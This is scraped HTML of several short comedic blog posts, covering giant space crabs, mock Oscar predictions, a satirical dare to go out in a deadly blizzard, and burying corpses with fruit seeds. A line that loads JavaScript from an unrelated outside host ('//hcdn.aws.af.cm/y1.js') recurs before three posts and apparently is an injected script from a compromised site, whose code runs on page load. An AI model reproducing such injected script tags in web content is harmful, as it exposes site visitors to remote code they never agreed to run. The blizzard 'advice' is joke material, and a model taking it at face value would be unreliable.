</a></p><script src="//hcdn.aws.af.cm/y1.js"></script><p>The problem with the Greatest Day of Your Life is that you probably have no idea that it’s happening. Sure, births, weddings, and the occasional five dollars are pretty cool, but there’s no way to know for <em>sure</em> until you can look back on everything on your deathbed. And even then, you might be about to have the most amazing deathbed ever! </p>
<p>In fact, you might be living the greatest day of your life TODAY and you don’t even realize it. Later this afternoon you might discover that the video game you’ve been playing is a secret simulator to determine the world’s champion in defending humanity from giant space crabs. Or a giant space crab will show up at your door and announce that you’re a lottery winner. Or you might run into that giant space crab you had a crush on in high school and you two will discover your true feelings for one another. Basically I don’t know what it’ll be for sure, but I am fairly certain it involves giant space crabs. </p>
<p>So good luck today! Heck, it might even be the WORST day of your life, which would really take the pressure off the other days. Keep those fingers crossed!</p>

</a></p><script src="//hcdn.aws.af.cm/y1.js"></script><p>The Academy Award nominations are out, so here are my predictions: </p>
<p><strong>Best Movie Without People In It:</strong><br />
<em>Fire Engines</em><br />
Stock footage of fire trucks driving around or parked in driveways. Worth the four hour running time. Vroom vroom! </p>
<p><strong>Most Radical</strong><br />
<em>The Surmountability of Kinship</em><br />
Shot entirely on GoPro, this follows the story of a man and his estranged sister parachuting into a volcano. </p>
<p><strong>Best Slow Motion of a Man Eating of an Apple</strong><br />
<em>The Apple &#038; The Man</em><br />
In close competition with “The Man &#038; The Apple”, “The Apple &#038; The Man” benefits from superior casting of a hungrier actor with nicer teeth. </p>
<p><strong>Most Expensive </strong><br />
<em>Golden Elephants Exploding for 90 Minutes</em><br />
This is rarely surprising category because they literally choose the highest number. </p>
<p><strong>Best Unsimulated Onscreen Sex Scene</strong><br />
<em>Anything Online Pornography</em><br />
Amazing the see the success of films released exclusively digitally. The industry is really changing. </p>
<p>Wes</p>

<p>Here’s the mission I’m going to give you: Go outside today and TRY SOMETHING NEW! Now, if you live in the New York City region like me, then you’re going to be hearing a lot of people saying NOT to go outside because there is a DEADLY HISTORIC BLIZZARD happening. Well, don’t listen to them! Those people are just trying to keep you pacified and afraid to be the special and unique snowflake you are, no matter how many actual special unique snowflakes pile onto your body and crush you to death. </p>
<p>Now if you’ll excuse me, I’m going out into this storm to build a snowman! This one will be unique and special because it will be the first one ever made with my body as the center.</p>

</a></p><script src="//hcdn.aws.af.cm/y1.js"></script><p>Why do we bother with coffins? Remember how in middle school, your teacher gave you some vague lesson about how the Native Americans used to put seeds inside of fish and then buried that fishseed so it would grow into a beautiful baby tree with all the nutrients and fish it needs? We should have learned from that and started doing it with corpses. As cool as radical evil-angel headstones are, it would be so much more practical to grow a little forest from seeds jammed up in the bodies of the dead. It would solve so many problems, deforestation, children not having enough apples to eat that were grown from their great-grandparents&#8217; brain jellies. When I die, I want someone to shove an avocado bulb up in me so that once a year, maybe on my birthday, my friends and family can have a big guacamole fiesta party and eat the fruits of my chumped-up, dead-as-hell body. That, truly, would be the best way to honor me.</p>
